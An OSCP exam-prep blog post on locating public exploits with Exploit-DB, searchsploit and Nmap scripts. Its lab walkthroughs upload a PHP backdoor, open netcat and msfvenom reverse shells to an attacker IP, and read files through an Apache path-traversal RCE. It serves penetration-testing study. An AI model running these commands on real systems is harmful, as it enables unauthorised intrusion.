---
title: Locating Public Exploits
date: 2024-02-11 09:45:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Public Exploit tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# Locating Public Exploits

After information gathering and enumeration, we can cross-check the discovered software for known vulnerabilities and find public exploits for them.

**Carefully read and understand all code before executing** a publicly-found exploit. If inspecting the code would be too complex, set up a VM with clean snapshots as an exploit testing ground (sandbox).

## Online Exploit Resources

### The Exploit Database (Exploit-DB/EDB)

[EDB](https://www.exploit-db.com/) is maintained by OffSec and stores exploits gathered through public resources, submissions, and mailing lists.

In the home page:
- D field allows you to download the file.
- A field lists the vulnerable application files of respective exploits which we could download to test on.
- V field indicates if the exploit has been verified by trusted members.
- Type field tags an exploit as dos, local, remote, or webapp.
- Platform field indicates which system(s) are impacted by the exploit.

In an exploit's page:
- EDB-ID - unique ID
- CVE
- Exploit code

### Packet Storm

[Packet Storm](https://packetstormsecurity.com/) is an InfoSec site that hosts up-to-date information on security news, tools, and exploits.

### GitHub

[OffSec has their own GitHub account](https://github.com/offensive-security) that hosts precompiled exploits for easy execution, such as those in exploitdb-bin-sploits.

### Google Search Operators

We can begin searching exploits using a software version and the "exploit" keyword. (Be careful with all public exploits!)

```console
$ firefox --search "Microsoft Edge site:exploit-db.com"
```

Other search operators we can use include inurl, intext, and intitle.

## Offline Exploit Resources

### Exploit Frameworks

Metasploit hosts preloaded exploits with minor config settings.

CoreImpact is owned by HelpSystems and there are no free versions. However, it can automate testing, link to vuln scanners, conduct phishing campaigns, and re-test systems to validate remediation efforts.

Canvas is a paid framework made by Immunity that is updated every month.

BeEF (Browser Exploitation Framework) is a pentest tool specific to client-side attacks to execute in a web browser.

### SearchSploit

The downloadable archived copy of all ExploitDB exploit code is included in Kali in the exploitdb package. 

Update your local copy in /usr/share/exploitdb:

```console
$ sudo apt update && sudo apt install exploitdb
```
/usr/share/exploitdb contains twoCSV files for each of the exploits and shellcode directories, which contain similar information to what you would find in the EDB website.

```console
$ ls -1 /usr/share/exploitdb/

exploits
files_exploits.csv
files_shellcodes.csv
shellcodes

$ ls -1 /usr/share/exploitdb/exploits

aix
alpha
android
arm
ashx
asp
aspx
atheos
beos
bsd
bsd_x86
cfm
cgi
freebsd
...
```

This is where Searchsploit comes in handy.

```console
// view the manual for help

$ searchsploit

// list all exploits for given search terms

$ searchsploit remote smb microsoft windows

// copy the exploit to your working dir using -m if you need to be able to modify it

$ searchsploit -m windows/remote/48537.py
$ searchsploit -m 42031
```

### Nmap NSE Scripts

Nmap enumeration can automate some of our tasks using scripts that can brute force, fuzz, and detect vulns. The whole repo can be found at /usr/share/nmap/scripts, and you can use grep to dearch for exploits.

```console
$ grep Exploits /usr/share/nmap/scripts/*.nse
```

Display specfici script info by running nmap with the --script-help option.

```console
$ nmap --script-help=clamav-exec.nse
```

## Exploiting a Target

Scan for open ports.

Imagine port 80 and 22 are running. SSH is generally not vulnerable, so let's check the web server in our browser.

Let's use a web directory enumeration tool to scan for hidden directories.

```console
gobuster dir -u http://192.168.204.11/ -w '/usr/share/wordlists/dirb/common.txt' 
```

Found an interesting dir? Check it out in the browser. Say we found a login portal with a software version qdPM 9.1 for a free web-based PM software. If we weren't given the software version upfront, we can check the source code.

[Search ExploitDB for "qdPM 9.1".](https://www.exploit-db.com/exploits/50944)https://www.exploit-db.com/exploits/50944

In reviewing the exploit code, we see the username must be an email address, which we have on the About Us page of our target side. However, we need passwords. You can use a wordlist generator on the site to compile keywords potentially used in passwords.

Copy the exploit to your working  dir. Run the exploit using the credentials you have found.

```console
$ python3 50944.py -url http://111.111.111.111/project/ -u jane@targetsite.com -p bruteforcedpassword

You are not able to use the designated admin account because they do not have a myAccount page.

The DateStamp is 2024-02-17 18:58 
Backdoor uploaded at - > http://111.111.111.111/project/uploads/users/972029-backdoor.php?cmd=whoami
```

Use curl to verify.

```console
$ curl http://111.111.111.111/project/uploads/users/972029-backdoor.php?cmd=whoami

<pre>www-data
</pre>     
```

Success! Modify your curl command to automatically encode your commands.

```console
$ curl http://111.111.111.111/project/uploads/users/972029-backdoor.php --data-urlencode "cmd=which nc"


<pre>/usr/bin/nc
</pre>    
```

This showed us that nc is on the target! Let's run a listener on the attacker machine and start a reverse shell from the target machine.

```console
// first terminal

$ nc -lvnp 6666

// second terminal

$ curl http://111.111.111.111/project/uploads/users/972029-backdoor.php --data-urlencode "cmd=nc -nv 222.222.222.222 6666 -e /bin/bash"
```

Additional Example 1:

```console
$ nmap -sV 111.111.111.111
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-17 14:19 EST
Nmap scan report for 192.168.204.10
Host is up (0.059s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE    SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: REMOTEMOUSE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

These are file share ports! Try to connect to SMB and look into the REMOTEMOUSE software.

```console
// enumerate smb shares
$ smbclient -L 111.111.111.111
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        offsec          Disk      
        Users           Disk  

// connect
$ smbclient //111.111.111.111/offsec
pswd: kali

// find REMOTEMOUSE installer and look at the version
smb: \> ls Downloads
.
.
.
$ searchsploit mouse server

$ searchsploit -m 50972

$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=222.222.222.222 LPORT=4443 -f exe > reverse.exe

$ nc -nvlp 4443

$ python3 -m http.server 80

$ python3 50972.py 111.111.111.111 222.222.222.222 payload.exe
```

Additional Example 2:

```console
$ nmap -sV 111.111.111.111         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-18 20:12 EST
Nmap scan report for 111.111.111.111
Host is up (0.046s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.49 ((Unix))

$ searchsploit 2.4.29
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE) | multiple/webapps/50383.sh

$ searchsploit -m 50383

// had to create text file for target in this exploit

$ nano targets.txt
111.111.111.111

$ ./50383.sh targets.txt /bin/sh whoami
$ ./50383.sh targets.txt /bin/sh "cat /home/bob/secret.txt"
```
